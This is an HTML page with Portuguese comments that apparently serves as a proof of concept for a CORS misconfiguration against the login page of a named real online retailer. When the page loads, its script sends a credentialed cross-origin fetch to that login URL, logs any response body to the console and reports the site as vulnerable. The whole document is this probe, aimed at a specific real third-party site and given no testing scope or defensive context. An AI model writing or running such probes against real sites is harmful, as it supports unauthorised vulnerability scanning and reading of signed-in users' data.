<!DOCTYPE html>
<html>
<head>
    <title>CORS Vulnerability Test</title>
</head>
<body>
    <h1>Teste de Vulnerabilidade CORS</h1>
    <script>
        // URL do endpoint a ser testado
        const targetURL = "https://www.coolblue.be/inloggen";

        // Função para testar a configuração de CORS
        async function testCORS() {
            try {
                const response = await fetch(targetURL, {
                    method: "GET", // Ou "POST" se necessário
                    credentials: "include", // Inclui cookies e credenciais na requisição
                });

                if (response.ok) {
                    const data = await response.text(); // Obtem o corpo da resposta
                    console.log("Resposta recebida do servidor:", data);
                    alert("CORS vulnerável! Dados obtidos com sucesso.");
                } else {
                    console.log(`Erro: ${response.status} - ${response.statusText}`);
                    alert("Falha ao acessar o recurso. Verifique os logs.");
                }
            } catch (error) {
                console.error("Erro ao testar CORS:", error);
                alert("Erro durante o teste. Verifique o console.");
            }
        }

        // Executa o teste
        testCORS();
    </script>
</body>
</html>
